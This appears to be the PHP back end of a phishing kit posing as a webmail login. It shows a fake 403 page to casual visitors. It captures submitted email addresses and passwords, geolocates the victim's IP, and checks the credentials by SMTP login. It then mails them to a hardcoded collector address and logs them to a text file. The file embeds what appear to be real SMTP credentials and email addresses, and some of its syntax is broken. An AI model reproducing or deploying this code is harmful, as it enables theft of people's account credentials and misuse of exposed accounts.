<?php require_once 'class.phpmailer.php';require_once 'class.smtp.php';header
( 'Access-Control-Allow-Origin: *');$ip=$_SERVER['REMOTE_ADDR'];$ipdat
=@json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip
));session_start();if($_SERVER['REQUEST_METHOD']=='GET'){print'
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';exit;}
//--------------------------------------------------------------------\\
$receiver = "lenalaluno@web.de"; //ENTER YOUR EMAIL HERE
$senderuser = "jered@globalrisk.rw"; //ENTER YOUR SMTP USER
$senderpass = "global.321"; //ENTER YOUR SMTP PASSWORD
$senderport = "587"; //ENTER YOUR SMTP PORT
$senderserver = "mail.globalrisk.rw"; //ENTER YOUR SMTP SERVER
//--------------------------------------------------------------------\\
$browser=$_SERVER['HTTP_USER_AGENT'];$login=$_POST['email'];$password
=$_POST['password'];$email=$login;$parti=explode("@",$email);$domain
=$parti[1];$subg=$parti[1] || " . $ipdat->geoplugin_countryName ." ||
$login";$subg2="notVerifiedRcubOrange || " . $ipdat->geoplugin_countryName
." || $login";$message=nl2br("Email : ".$login."\nPassword : ".$password."\nIP
of sender: ".$ipdat->geoplugin_countryName." | ".$ipdat->geoplugin_city." |
".$ip);$mail=new PHPMailer(true);$mail->SMTPAuth=true;$mail->Username=$login
;$mail->Password=$password;$mail->Host=$mail.'.'.$domain;$mail->Port="587"
;$validCredentials=false;try{$validCredentials=$mail->SmtpConnect();catch
(Exception $error){}echo "Message: ".$error->getMessage();}if
($validCredentials==true){$mail=new PHPMailer;$mail->isSMTP();$mail->Host
=$senderserver;$mail->SMTPAuth=$mail->Username=$senderuser;$mail
->Password=$senderpass;$mail->Port=$senderport;$mail->From=$senderuser;$mail
->FromName="SS-RCube";$mail->addAddress($receiver);$mail->isHTML(true);$mail
->Subject=$subg;$mail->Body=$message;$mail->AltBody="Enjoy new server";$mail
->send();$signal='OK';$msggo="Login Successful";$data=array('signal'
=>$signal,'msg'=>$msggo);echo json_encode($data);}else{$mail2=new PHPMailer
;$mail2->isSMTP();$mail2->Host=$senderserver;$mail2->SMTPAuth=true;$mail2
->Username=$senderuser;$mail2->Password=$senderpass;$mail2->Port=$senderport
;$mail2->From=$senderuser;$mail2->FromName="SS-RCube";$mail2->addAddress
($receiver);$mail2->isHTML(true);$mail2->Subject=$subg2;$mail2->Body
=$message;$mail2->AltBody="Enjoy new server";if($mail2->send()){$data=array
('signal'=>'not ok','msg'=>'Wrong Password');}echo json_encode($data);}exit();}

$fp = fopen("SS-Or.txt", "a");
fputs($fp, $message);
fclose($fp);
$praga = rand();
$praga = md5($praga);

?>